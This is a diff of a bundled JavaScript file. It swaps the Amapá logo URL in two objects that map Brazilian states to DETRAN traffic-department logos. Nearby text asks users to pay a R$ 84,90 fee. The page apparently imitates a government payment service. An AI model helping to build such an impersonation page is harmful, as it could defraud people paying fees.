@@ -22016,7 +22016,7 @@ function LE() {
 const Rg = {
   AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
   AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
-  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+  AP: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/81/Bras%C3%A3o_do_Amap%C3%A1.svg/200px-Bras%C3%A3o_do_Amap%C3%A1.svg.png",
   AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
   BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
   CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
@@ -23191,7 +23191,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 84,90, clique no botão 
 const FE = {
   AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
   AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
-  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+  AP: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/81/Bras%C3%A3o_do_Amap%C3%A1.svg/200px-Bras%C3%A3o_do_Amap%C3%A1.svg.png",
   AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
   BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
   CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
